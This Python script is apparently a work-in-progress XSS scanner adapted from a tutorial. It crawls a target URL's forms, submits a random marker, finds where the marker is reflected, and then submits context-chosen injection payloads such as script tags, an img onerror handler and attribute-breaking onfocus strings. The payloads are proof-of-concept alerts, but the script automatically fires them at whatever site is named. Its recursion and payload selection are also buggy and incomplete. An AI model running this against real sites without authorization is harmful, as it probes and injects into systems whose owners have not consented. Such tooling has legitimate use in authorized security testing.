#the original script was taken from https://thepythoncode.com/article/make-a-xss-vulnerability-scanner-in-python
#this is still a work in progress. I am modifying the script to look for more xss vulnerabilities
#at the moment it's been modified to enter a unique 8 character string into each field on a site and determine the context of where the string is. Based on that context it determines the paylaod to use
#later updates will add payloads for strings that are in javascript, and add more payloads and methods of attack

import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import string
import random
import urllib.request

def get_all_forms(url):
    """Given a `url`, it returns all forms from the HTML content"""
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    """
    This function extracts all possible useful information about an HTML `form`
    """
    details = {}
    # get the form action (target url)
    action = form.attrs.get("action", "").lower()
    # get the form method (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()
    # get all the input details such as type and name
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

ran_arr = []

def submit_form(form_details, url, payload):
    """
    Submits a form given in `form_details`
    Params:
        form_details (list): a dictionary that contain form information
        url (str): the original URL that contain that form
        value (str): this will be replaced to all text and search inputs
    Returns the HTTP Response after form submission
    """
    # construct the full URL (if the url provided in action is relative)
    target_url = urljoin(url, form_details["action"])
    # get the inputs
    inputs = form_details["inputs"]
    data = {}
    
    for input in inputs:
        # places a random string in the field 
        if input["type"] == "text" or input["type"] == "search":
            if payload == "ran":
                ran = ''.join(random.choices(string.ascii_lowercase +
                                 string.digits, k=8))
                ran_arr.append(ran)
                input["value"] = ran
            else:
                input["value"] = payload
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            # if input name and value are not None, 
            # then add them to the data of form submission
            data[input_name] = input_value

    print(f"[+] Submitting malicious payload to {target_url}")
    print(f"[+] Data: {data}")
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        # GET request
        return requests.get(target_url, params=data)

prev_payload = False
def scan_xss(url, payload):
    """
    Given a `url`, it prints all XSS vulnerable forms and 
    returns True if any is vulnerable, False otherwise
    """
    # get all the forms from the URL
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    # returning value
    is_vulnerable = False
    # iterate over all forms
    dtr = []
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, payload).content.decode()
        
        if payload in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            pprint(form_details)
            is_vulnerable = True
        #looks for random value in html, if it finds it add the line of html containing value to a list
        else:
            for val in ran_arr:
                for line in content.splitlines():
                    if val in line:
                        dtr.append(line)
            alt_payload = dtr_context(dtr)
            scan_xss(url,alt_payload) 

def dtr_context(lines):
    for line in lines:
        print(line) 
        print(line.split(ran_arr[0])[1])
        str_split=line.split(ran_arr[0])[1]
        if str_split[1]=="<":
            print("between html tag")
            context="between"
        elif str_split[1]==">":
            print("within html tags")
            context="within"
        else:
            print("potentially within javascript or was not caught correctly. haven't gotten to this yet")
            context="other"
        payload = dtr_payload(context)
        return payload


def dtr_payload(context):
    global prev_payload
    if context == "between":
        if prev_payload:
            payload="<img src=1 onerror=alert(1)>"
        else:
            payload="<script>alert(document.domain)</script>"
            prev_payload=True
        
    elif context == "within":
        if prev_payload:
            payload='"><script>alert(document.domain)</script>'
            
        else:
            payload='" autofocus onfocus=alert(document.domain) x="'
            prev_payload=True
        
    #else:
        #add payloads for strings inside javascript
    
    return payload

if __name__ == "__main__":
    import sys
    url = sys.argv[1]
    print(scan_xss(url, "ran"))
